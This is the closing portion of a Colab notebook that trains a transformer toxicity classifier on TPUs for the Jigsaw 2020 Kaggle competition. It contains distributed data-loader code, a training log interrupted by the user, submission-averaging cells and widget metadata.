    "    device = xm.xla_device()\n",
    "    net.to(device)\n",
    "\n",
    "    train_sampler = DistributedSamplerWrapper(\n",
    "        sampler=BalanceClassSampler(labels=train_dataset.get_labels(), mode=\"downsampling\"),\n",
    "        num_replicas=xm.xrt_world_size(),\n",
    "        rank=xm.get_ordinal(),\n",
    "        shuffle=True\n",
    "    )\n",
    "    train_loader = torch.utils.data.DataLoader(\n",
    "        train_dataset,\n",
    "        batch_size=TrainGlobalConfig.batch_size,\n",
    "        sampler=train_sampler,\n",
    "        pin_memory=False,\n",
    "        drop_last=True,\n",
    "        num_workers=TrainGlobalConfig.num_workers,\n",
    "    )\n",
    "    validation_sampler = torch.utils.data.distributed.DistributedSampler(\n",
    "        validation_dataset,\n",
    "        num_replicas=xm.xrt_world_size(),\n",
    "        rank=xm.get_ordinal(),\n",
    "        shuffle=False\n",
    "    )\n",
    "    validation_loader = torch.utils.data.DataLoader(\n",
    "        validation_dataset,\n",
    "        batch_size=TrainGlobalConfig.batch_size,\n",
    "        sampler=validation_sampler,\n",
    "        pin_memory=False,\n",
    "        drop_last=False,\n",
    "        num_workers=TrainGlobalConfig.num_workers\n",
    "    )\n",
    "    validation_tune_sampler = torch.utils.data.distributed.DistributedSampler(\n",
    "        validation_tune_dataset,\n",
    "        num_replicas=xm.xrt_world_size(),\n",
    "        rank=xm.get_ordinal(),\n",
    "        shuffle=True\n",
    "    )\n",
    "    validation_tune_loader = torch.utils.data.DataLoader(\n",
    "        validation_tune_dataset,\n",
    "        batch_size=TrainGlobalConfig.batch_size,\n",
    "        sampler=validation_tune_sampler,\n",
    "        pin_memory=False,\n",
    "        drop_last=False,\n",
    "        num_workers=TrainGlobalConfig.num_workers\n",
    "    )\n",
    "    test_sampler = torch.utils.data.distributed.DistributedSampler(\n",
    "        test_dataset,\n",
    "        num_replicas=xm.xrt_world_size(),\n",
    "        rank=xm.get_ordinal(),\n",
    "        shuffle=False\n",
    "    )\n",
    "    test_loader = torch.utils.data.DataLoader(\n",
    "        test_dataset,\n",
    "        batch_size=TrainGlobalConfig.batch_size,\n",
    "        sampler=test_sampler,\n",
    "        pin_memory=False,\n",
    "        drop_last=False,\n",
    "        num_workers=TrainGlobalConfig.num_workers\n",
    "    )\n",
    "\n",
    "    if rank == 0:\n",
    "        time.sleep(1)\n",
    "\n",
    "    fitter = TPUFitter(model=net, device=device, config=TrainGlobalConfig)\n",
    "    fitter.fit(train_loader, validation_loader)\n",
    "    fitter.run_tuning_and_inference(test_loader, validation_tune_loader)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 677
    },
    "colab_type": "code",
    "id": "aKuUULH7l5W1",
    "outputId": "6f9fe5df-d9d8-4dc5-f0a8-c45f9886750c"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitter prepared. Device is xla:1\n",
      "\n",
      "2020-06-09T08:03:36.922780\n",
      "LR: 4e-05\n",
      "Train Step 0, loss: 0.00000, final_score: 0.00000, time: 1.43609\n",
      "Train Step 50, loss: 0.71324, final_score: 0.77635, time: 210.09305\n",
      "Train Step 100, loss: 0.63146, final_score: 0.87028, time: 273.92343\n",
      "Train Step 150, loss: 0.59016, final_score: 0.90775, time: 338.15796\n",
      "Train Step 200, loss: 0.57200, final_score: 0.92248, time: 403.45247\n",
      "Train Step 250, loss: 0.55798, final_score: 0.93375, time: 468.78272\n",
      "Train Step 300, loss: 0.54871, final_score: 0.94023, time: 536.61280\n",
      "Train Step 350, loss: 0.54097, final_score: 0.94614, time: 602.84036\n",
      "Train Step 400, loss: 0.53371, final_score: 0.95122, time: 671.59135\n",
      "Train Step 450, loss: 0.52967, final_score: 0.95386, time: 738.91569\n",
      "Train Step 500, loss: 0.52646, final_score: 0.95545, time: 805.57373\n",
      "Train Step 550, loss: 0.52360, final_score: 0.95708, time: 872.71405\n",
      "Train Step 600, loss: 0.52080, final_score: 0.95885, time: 937.61254\n",
      "Train Step 650, loss: 0.51781, final_score: 0.96080, time: 1005.15575\n",
      "Train Step 700, loss: 0.51572, final_score: 0.96223, time: 1072.83772\n",
      "Train Step 750, loss: 0.51433, final_score: 0.96291, time: 1137.43737\n",
      "Train Step 800, loss: 0.51189, final_score: 0.96433, time: 1201.92498\n",
      "Train Step 850, loss: 0.50972, final_score: 0.96550, time: 1269.49343\n",
      "Train Step 900, loss: 0.50901, final_score: 0.96613, time: 1334.90398\n",
      "Train Step 950, loss: 0.50752, final_score: 0.96716, time: 1404.00112\n",
      "Train Step 1000, loss: 0.50639, final_score: 0.96791, time: 1472.80007\n",
      "Train Step 1050, loss: 0.50529, final_score: 0.96856, time: 1542.00577\n",
      "Train Step 1100, loss: 0.50436, final_score: 0.96909, time: 1613.08948\n",
      "Train Step 1150, loss: 0.50316, final_score: 0.96982, time: 1678.95594\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-37-190baae95077>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mFLAGS\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m{\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m \u001b[0mxmp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mspawn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0m_mp_fn\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mFLAGS\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mnprocs\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m8\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstart_method\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m'fork'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      3\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mdatetime\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mdate\u001b[0m\u001b[0;34m;\u001b[0m \u001b[0mtoday\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdate\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtoday\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m;\u001b[0m \u001b[0moutput_model_file\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m'bert_tpu_trained.bin'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0mtorch\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msave\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mnet\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstate_dict\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34mf\"{today}_{output_model_file}\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch_xla/distributed/xla_multiprocessing.py\u001b[0m in \u001b[0;36mspawn\u001b[0;34m(fn, args, nprocs, join, daemon, start_method)\u001b[0m\n\u001b[1;32m    180\u001b[0m         \u001b[0mjoin\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    181\u001b[0m         \u001b[0mdaemon\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mdaemon\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 182\u001b[0;31m         start_method=start_method)\n\u001b[0m",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/multiprocessing/spawn.py\u001b[0m in \u001b[0;36mstart_processes\u001b[0;34m(fn, args, nprocs, join, daemon, start_method)\u001b[0m\n\u001b[1;32m    156\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    157\u001b[0m     \u001b[0;31m# Loop on join until it returns True or raises an exception.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 158\u001b[0;31m     \u001b[0;32mwhile\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mcontext\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    159\u001b[0m         \u001b[0;32mpass\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    160\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/multiprocessing/spawn.py\u001b[0m in \u001b[0;36mjoin\u001b[0;34m(self, timeout)\u001b[0m\n\u001b[1;32m     76\u001b[0m         ready = multiprocessing.connection.wait(\n\u001b[1;32m     77\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msentinels\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mkeys\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 78\u001b[0;31m             \u001b[0mtimeout\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mtimeout\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     79\u001b[0m         )\n\u001b[1;32m     80\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.6/multiprocessing/connection.py\u001b[0m in \u001b[0;36mwait\u001b[0;34m(object_list, timeout)\u001b[0m\n\u001b[1;32m    909\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    910\u001b[0m             \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 911\u001b[0;31m                 \u001b[0mready\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mselector\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mselect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtimeout\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    912\u001b[0m                 \u001b[0;32mif\u001b[0m \u001b[0mready\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    913\u001b[0m                     \u001b[0;32mreturn\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfileobj\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevents\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mready\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.6/selectors.py\u001b[0m in \u001b[0;36mselect\u001b[0;34m(self, timeout)\u001b[0m\n\u001b[1;32m    374\u001b[0m             \u001b[0mready\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    375\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 376\u001b[0;31m                 \u001b[0mfd_event_list\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_poll\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpoll\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtimeout\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    377\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mInterruptedError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    378\u001b[0m                 \u001b[0;32mreturn\u001b[0m \u001b[0mready\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "FLAGS={}\n",
    "xmp.spawn(_mp_fn, args=(FLAGS,), nprocs=8, start_method='fork')\n",
    "from datetime import date; today = date.today(); output_model_file='bert_tpu_trained.bin'\n",
    "torch.save(net.state_dict(), f\"{today}_{output_model_file}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "Wu0VhhZAFuYs"
   },
   "outputs": [],
   "source": [
    "submission = pd.concat([pd.read_csv(path) for path in glob('node_submissions/*.csv')]).groupby('id').mean()\n",
    "submission['toxic'].hist(bins=100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "RRr-yzJ_yVTW"
   },
   "outputs": [],
   "source": [
    "submission.to_csv(f'{ROOT_PATH}/submission.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "ARz9TllfyVVa"
   },
   "outputs": [],
   "source": [
    "# !cp log.txt '/content/drive/My Drive/jigsaw2020-kaggle-public-baseline/'\n",
    "!make push_dataset"
   ]
  }
 ],
 "metadata": {
  "accelerator": "TPU",
  "colab": {
   "authorship_tag": "ABX9TyOpdCFYAdirb85VBQKiAOPF",
   "collapsed_sections": [],
   "machine_shape": "hm",
   "mount_file_id": "1ve-moJKrkHWvFt52DhCldoPTQRm2H4c4",
   "name": "shonenkov-training-pipeline.ipynb",
   "provenance": []
  },
  "jupytext": {
   "cell_metadata_filter": "outputId,id,colab_type,colab,-all",
   "encoding": "# -*- coding: utf-8 -*-",
   "main_language": "python",
   "notebook_metadata_filter": "-all"
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  },
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "02d9b2a5f73140cea2a7200c026a0269": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "ProgressStyleModel",
     "state": {
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "ProgressStyleModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "StyleView",
      "bar_color": null,
      "description_width": "initial"
     }
    },
    "0c89370f1e14432d97d27e5b566bb2be": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "IntProgressModel",
     "state": {
      "_dom_classes": [],
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "IntProgressModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/controls",
      "_view_module_version": "1.5.0",
      "_view_name": "ProgressView",
      "bar_style": "success",
      "description": "Downloading: 100%",
      "description_tooltip": null,
      "layout": "IPY_MODEL_ab9a4062e20a4ac9b435a6125fef5cba",
      "max": 513,
      "min": 0,
      "orientation": "horizontal",
      "style": "IPY_MODEL_02d9b2a5f73140cea2a7200c026a0269",
      "value": 513
     }
    },
    "400e12ae27e44d288f7c6c7dd1ddbb5a": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "DescriptionStyleModel",
     "state": {
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "DescriptionStyleModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "StyleView",
      "description_width": ""
     }
    },
    "427e2d6eaff64f8ab4b0cbb87819a16b": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "DescriptionStyleModel",
     "state": {
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "DescriptionStyleModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "StyleView",
      "description_width": ""
     }
    },
    "6660c1bb684d45c0b9f3181f60bd69b0": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "ProgressStyleModel",
     "state": {
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "ProgressStyleModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "StyleView",
      "bar_color": null,
      "description_width": "initial"
     }
    },
    "7072f1c33925408cb4602f16248b7233": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "IntProgressModel",
     "state": {
      "_dom_classes": [],
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "IntProgressModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/controls",
      "_view_module_version": "1.5.0",
      "_view_name": "ProgressView",
      "bar_style": "success",
      "description": "Downloading: 100%",
      "description_tooltip": null,
      "layout": "IPY_MODEL_f33626631eff47edb3a6977ff3072568",
      "max": 2244861551,
      "min": 0,
      "orientation": "horizontal",
      "style": "IPY_MODEL_6660c1bb684d45c0b9f3181f60bd69b0",
      "value": 2244861551
     }
    },
    "831e2c2466bc4706820928ef52e9d43b": {
     "model_module": "@jupyter-widgets/base",
     "model_name": "LayoutModel",
     "state": {
      "_model_module": "@jupyter-widgets/base",
      "_model_module_version": "1.2.0",
      "_model_name": "LayoutModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "LayoutView",
      "align_content": null,
      "align_items": null,
      "align_self": null,
      "border": null,
      "bottom": null,
      "display": null,
      "flex": null,
      "flex_flow": null,
      "grid_area": null,
      "grid_auto_columns": null,
      "grid_auto_flow": null,
      "grid_auto_rows": null,
      "grid_column": null,
      "grid_gap": null,
      "grid_row": null,
      "grid_template_areas": null,
      "grid_template_columns": null,
      "grid_template_rows": null,
      "height": null,
      "justify_content": null,
      "justify_items": null,
      "left": null,
      "margin": null,
      "max_height": null,
      "max_width": null,
      "min_height": null,
      "min_width": null,
      "object_fit": null,
      "object_position": null,
      "order": null,
      "overflow": null,
      "overflow_x": null,
      "overflow_y": null,
      "padding": null,
      "right": null,
      "top": null,
      "visibility": null,
      "width": null
     }
    },
    "8c4206d2621f47dd96bd3e9c61a21ba1": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "HTMLModel",
     "state": {
      "_dom_classes": [],
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "HTMLModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/controls",
      "_view_module_version": "1.5.0",
      "_view_name": "HTMLView",
      "description": "",
      "description_tooltip": null,
      "layout": "IPY_MODEL_f82755ad350542d0a31aa64d4c7502c7",
      "placeholder": "​",
      "style": "IPY_MODEL_427e2d6eaff64f8ab4b0cbb87819a16b",
      "value": " 2.24G/2.24G [00:53&lt;00:00, 42.1MB/s]"
     }
    },
    "91a008dd264c478abeede676c12aac6c": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "HBoxModel",
     "state": {
      "_dom_classes": [],
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "HBoxModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/controls",
      "_view_module_version": "1.5.0",
      "_view_name": "HBoxView",
      "box_style": "",
      "children": [
       "IPY_MODEL_7072f1c33925408cb4602f16248b7233",
       "IPY_MODEL_8c4206d2621f47dd96bd3e9c61a21ba1"
      ],
      "layout": "IPY_MODEL_dd64e537195d4d83bb11532093923423"
     }
    },
    "9fc4391950ec4d3485c09ecca6865f31": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "HBoxModel",
     "state": {
      "_dom_classes": [],
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "HBoxModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/controls",
      "_view_module_version": "1.5.0",
      "_view_name": "HBoxView",
      "box_style": "",
      "children": [
       "IPY_MODEL_0c89370f1e14432d97d27e5b566bb2be",
       "IPY_MODEL_adccc5bc3c5649e08947bf303da9235e"
      ],
      "layout": "IPY_MODEL_831e2c2466bc4706820928ef52e9d43b"
     }
    },
    "a479796d76a04d748f676bc4919adb03": {
     "model_module": "@jupyter-widgets/base",
     "model_name": "LayoutModel",
     "state": {
      "_model_module": "@jupyter-widgets/base",
      "_model_module_version": "1.2.0",
      "_model_name": "LayoutModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "LayoutView",
      "align_content": null,
      "align_items": null,
      "align_self": null,
      "border": null,
      "bottom": null,
      "display": null,
      "flex": null,
      "flex_flow": null,
      "grid_area": null,
      "grid_auto_columns": null,
      "grid_auto_flow": null,
      "grid_auto_rows": null,
      "grid_column": null,
      "grid_gap": null,
      "grid_row": null,
      "grid_template_areas": null,
      "grid_template_columns": null,
      "grid_template_rows": null,
      "height": null,
      "justify_content": null,
      "justify_items": null,
      "left": null,
      "margin": null,
      "max_height": null,
      "max_width": null,
      "min_height": null,
      "min_width": null,
      "object_fit": null,
      "object_position": null,
      "order": null,
      "overflow": null,
      "overflow_x": null,
      "overflow_y": null,
      "padding": null,
      "right": null,
      "top": null,
      "visibility": null,
      "width": null
     }
    },
    "ab9a4062e20a4ac9b435a6125fef5cba": {
     "model_module": "@jupyter-widgets/base",
     "model_name": "LayoutModel",
     "state": {
      "_model_module": "@jupyter-widgets/base",
      "_model_module_version": "1.2.0",
      "_model_name": "LayoutModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "LayoutView",
      "align_content": null,
      "align_items": null,
      "align_self": null,
      "border": null,
      "bottom": null,
      "display": null,
      "flex": null,
      "flex_flow": null,
      "grid_area": null,
      "grid_auto_columns": null,
      "grid_auto_flow": null,
      "grid_auto_rows": null,
      "grid_column": null,
      "grid_gap": null,
      "grid_row": null,
      "grid_template_areas": null,
      "grid_template_columns": null,
      "grid_template_rows": null,
      "height": null,
      "justify_content": null,
      "justify_items": null,
      "left": null,
      "margin": null,
      "max_height": null,
      "max_width": null,
      "min_height": null,
      "min_width": null,
      "object_fit": null,
      "object_position": null,
      "order": null,
      "overflow": null,
      "overflow_x": null,
      "overflow_y": null,
      "padding": null,
      "right": null,
      "top": null,
      "visibility": null,
      "width": null
     }
    },
    "adccc5bc3c5649e08947bf303da9235e": {
     "model_module": "@jupyter-widgets/controls",
     "model_name": "HTMLModel",
     "state": {
      "_dom_classes": [],
      "_model_module": "@jupyter-widgets/controls",
      "_model_module_version": "1.5.0",
      "_model_name": "HTMLModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/controls",
      "_view_module_version": "1.5.0",
      "_view_name": "HTMLView",
      "description": "",
      "description_tooltip": null,
      "layout": "IPY_MODEL_a479796d76a04d748f676bc4919adb03",
      "placeholder": "​",
      "style": "IPY_MODEL_400e12ae27e44d288f7c6c7dd1ddbb5a",
      "value": " 513/513 [00:53&lt;00:00, 9.54B/s]"
     }
    },
    "dd64e537195d4d83bb11532093923423": {
     "model_module": "@jupyter-widgets/base",
     "model_name": "LayoutModel",
     "state": {
      "_model_module": "@jupyter-widgets/base",
      "_model_module_version": "1.2.0",
      "_model_name": "LayoutModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "LayoutView",
      "align_content": null,
      "align_items": null,
      "align_self": null,
      "border": null,
      "bottom": null,
      "display": null,
      "flex": null,
      "flex_flow": null,
      "grid_area": null,
      "grid_auto_columns": null,
      "grid_auto_flow": null,
      "grid_auto_rows": null,
      "grid_column": null,
      "grid_gap": null,
      "grid_row": null,
      "grid_template_areas": null,
      "grid_template_columns": null,
      "grid_template_rows": null,
      "height": null,
      "justify_content": null,
      "justify_items": null,
      "left": null,
      "margin": null,
      "max_height": null,
      "max_width": null,
      "min_height": null,
      "min_width": null,
      "object_fit": null,
      "object_position": null,
      "order": null,
      "overflow": null,
      "overflow_x": null,
      "overflow_y": null,
      "padding": null,
      "right": null,
      "top": null,
      "visibility": null,
      "width": null
     }
    },
    "f33626631eff47edb3a6977ff3072568": {
     "model_module": "@jupyter-widgets/base",
     "model_name": "LayoutModel",
     "state": {
      "_model_module": "@jupyter-widgets/base",
      "_model_module_version": "1.2.0",
      "_model_name": "LayoutModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "LayoutView",
      "align_content": null,
      "align_items": null,
      "align_self": null,
      "border": null,
      "bottom": null,
      "display": null,
      "flex": null,
      "flex_flow": null,
      "grid_area": null,
      "grid_auto_columns": null,
      "grid_auto_flow": null,
      "grid_auto_rows": null,
      "grid_column": null,
      "grid_gap": null,
      "grid_row": null,
      "grid_template_areas": null,
      "grid_template_columns": null,
      "grid_template_rows": null,
      "height": null,
      "justify_content": null,
      "justify_items": null,
      "left": null,
      "margin": null,
      "max_height": null,
      "max_width": null,
      "min_height": null,
      "min_width": null,
      "object_fit": null,
      "object_position": null,
      "order": null,
      "overflow": null,
      "overflow_x": null,
      "overflow_y": null,
      "padding": null,
      "right": null,
      "top": null,
      "visibility": null,
      "width": null
     }
    },
    "f82755ad350542d0a31aa64d4c7502c7": {
     "model_module": "@jupyter-widgets/base",
     "model_name": "LayoutModel",
     "state": {
      "_model_module": "@jupyter-widgets/base",
      "_model_module_version": "1.2.0",
      "_model_name": "LayoutModel",
      "_view_count": null,
      "_view_module": "@jupyter-widgets/base",
      "_view_module_version": "1.2.0",
      "_view_name": "LayoutView",
      "align_content": null,
      "align_items": null,
      "align_self": null,
      "border": null,
      "bottom": null,
      "display": null,
      "flex": null,
      "flex_flow": null,
      "grid_area": null,
      "grid_auto_columns": null,
      "grid_auto_flow": null,
      "grid_auto_rows": null,
      "grid_column": null,
      "grid_gap": null,
      "grid_row": null,
      "grid_template_areas": null,
      "grid_template_columns": null,
      "grid_template_rows": null,
      "height": null,
      "justify_content": null,
      "justify_items": null,
      "left": null,
      "margin": null,
      "max_height": null,
      "max_width": null,
      "min_height": null,
      "min_width": null,
      "object_fit": null,
      "object_position": null,
      "order": null,
      "overflow": null,
      "overflow_x": null,
      "overflow_y": null,
      "padding": null,
      "right": null,
      "top": null,
      "visibility": null,
      "width": null
     }
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
